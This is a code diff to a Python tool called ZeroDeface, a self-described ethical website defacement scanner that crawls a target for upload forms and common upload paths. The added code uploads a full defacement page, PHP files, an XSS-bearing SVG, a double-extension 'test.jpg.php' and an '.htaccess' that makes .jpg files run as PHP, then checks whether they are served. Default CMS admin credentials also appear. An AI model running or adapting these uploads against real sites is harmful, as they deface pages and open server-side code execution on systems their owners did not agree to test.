@@ -36,7 +36,16 @@ class DefacementScanner:
             'joomla': [('admin', 'admin'), ('admin', 'password')],
             'drupal': [('admin', 'admin'), ('admin', 'password')]
         }
-        self.test_content = "DEFACED_BY_ZERODEFACE_TEST"
+        self.test_content = "DEFACED_BY_ZEROSCOPE_TEST"
+        self.test_patterns = [
+            "DEFACED_BY_", 
+            "SECURITY_TEST",
+            "HACKED_BY",
+            "TEST_ID:",
+            "simulated defacement",
+            "ZEROSCOPE_TEST",
+            "VULNERABLE_TO_UPLOAD"
+        ]
 
     def print_banner(self):
         banner = r"""
@@ -49,7 +58,7 @@ __________                 ________          _____
         """
         print("\033[1;31m" + banner + "\033[0m")
         print("\033[1;37mZeroDeface - Website Defacement Vulnerability Scanner\033[0m")
-        print("\033[1;33mVersion 1.0 | Ethical Use Only | Safe Simulation Mode\033[0m\n")
+        print("\033[1;33mVersion 1.1 | Ethical Use Only | Safe Simulation Mode\033[0m\n")
 
     def log_vulnerability(self, category, description, exploit=None, proof=None):
         vuln = {
@@ -62,6 +71,17 @@ __________                 ________          _____
         self.vulnerabilities.append(vuln)
         print(f"\033[1;31m[!] {category} found:\033[0m {description}")
 
+    def is_defacement_detected(self, response_text):
+        """Flexible detection of defacement patterns"""
+        response_lower = response_text.lower()
+        return any(
+            pattern.lower() in response_lower 
+            for pattern in self.test_patterns
+        ) or any(
+            keyword in response_text 
+            for keyword in ["DEFACED", "HACKED", "TESTING", "SECURITY_TEST", "ZEROSCOPE"]
+        )
+
     def crawl_for_forms(self):
         try:
             response = self.session.get(self.target_url, verify=False, timeout=10)
@@ -73,10 +93,29 @@ __________                 ________          _____
 
     def test_file_upload(self, form, action_url):
         test_files = [
-            ('test.html', 'text/html', f'<html><body>{self.test_content}</body></html>'),
-            ('test.php', 'application/x-php', '<?php echo "TEST_UPLOAD_SUCCESS"; ?>'),
-            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS")</script></svg>'),
-            ('test.js', 'application/javascript', 'alert("TEST_UPLOAD_SUCCESS");')
+            ('test.html', 'text/html', '''<!DOCTYPE html>
+<html>
+<head>
+    <title>SECURITY_TEST_DEFACEMENT</title>
+    <style>
+        body { background-color: black; color: white; text-align: center; }
+    </style>
+</head>
+<body>
+    <h1>DEFACED_BY_ZEROSCOPE_TEST</h1>
+    <p>This is a simulated defacement for security testing purposes only.</p>
+    <p>If you see this page, the site is vulnerable to file upload attacks.</p>
+    <div style="margin-top:50px;font-size:12px;color:#ccc;">
+        TEST_ID: ZS-HTML-{RANDOM_8DIGIT}
+    </div>
+</body>
+</html>'''),
+            ('test.php', 'application/x-php', '<?php echo "VULNERABLE_TO_UPLOAD: ".$_SERVER["HTTP_HOST"]; ?>'),
+            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS_VULNERABLE")</script></svg>'),
+            ('test.js', 'application/javascript', 'alert("SITE_VULNERABLE_TO_UPLOAD");'),
+            ('test.jpg.php', 'image/jpeg', '<?php echo "JPG_UPLOAD_WORKING"; ?>'),
+            ('test.config', 'text/plain', 'VULNERABLE_CONFIG_FILE=TRUE'),
+            ('.htaccess', 'text/plain', 'RewriteEngine On\nAddType application/x-httpd-php .jpg')
         ]
         
         for filename, content_type, content in test_files:
@@ -86,34 +125,35 @@ __________                 ________          _____
                 response = self.session.post(upload_url, files=files, verify=False, timeout=15)
                 
                 if response.status_code in [200, 201, 302]:
-                    if filename in response.text:
-                        file_url = urljoin(upload_url, filename)
-                        file_response = self.session.get(file_url, verify=False, timeout=10)
-                        
-                        if file_response.status_code == 200 and (self.test_content in file_response.text or filename.split('.')[-1] in file_response.text):
-                            exploit = f"curl -F 'file=@{filename}' {upload_url}"
-                            self.log_vulnerability(
-                                "File Upload Vulnerability",
-                                f"File upload possible at {upload_url} - {filename} accessible at {file_url}",
-                                exploit=exploit,
-                                proof=file_response.text[:200] + "..."
-                            )
-                            self.uploaded_files.append(file_url)
-                            return True
+                    # Check both direct filename reference and content patterns
+                    file_url = urljoin(upload_url, filename)
+                    file_response = self.session.get(file_url, verify=False, timeout=10)
+                    
+                    if file_response.status_code == 200 and self.is_defacement_detected(file_response.text):
+                        exploit = f"curl -F 'file=@{filename}' {upload_url}"
+                        self.log_vulnerability(
+                            "File Upload Vulnerability",
+                            f"File upload possible at {upload_url} - {filename} accessible at {file_url}",
+                            exploit=exploit,
+                            proof=file_response.text[:500] + "..."
+                        )
+                        self.uploaded_files.append(file_url)
+                        return True
             except Exception as e:
                 print(f"[-] Error testing upload for {filename}: {e}")
         return False
 
-    def scan_upload_vulnerabilities(self):  # Fixed method name (plural)
+    def scan_upload_vulnerabilities(self):
         print("[*] Scanning for file upload vulnerabilities...")
         forms = self.crawl_for_forms()
+        found = False
         
         for form in forms:
             if form.find('input', {'type': 'file'}):
                 action = form.get('action', '') or self.target_url
                 print(f"[*] Found file upload form at {action}")
                 if self.test_file_upload(form, action):
-                    return True
+                    found = True
         
         common_upload_paths = ['upload', 'file-upload', 'upload-file', 'admin/upload']
         for path in common_upload_paths:
@@ -126,10 +166,10 @@ __________                 ________          _____
                         def __init__(self, action):
                             self.attrs = {'action': action}
                     if self.test_file_upload(DummyForm(upload_url), upload_url):
-                        return True
+                        found = True
             except:
                 continue
-        return False
+        return found
 
     def scan_exposed_editors(self):
         print("[*] Scanning for exposed content editors...")
@@ -366,7 +406,7 @@ Examples:
         scanner = DefacementScanner(args.url)
         
         if args.all or args.upload_test:
-            scanner.scan_upload_vulnerabilities()  # Now matches the method name
+            scanner.scan_upload_vulnerabilities()
         
         if args.all or args.scan_editors:
             scanner.scan_exposed_editors()
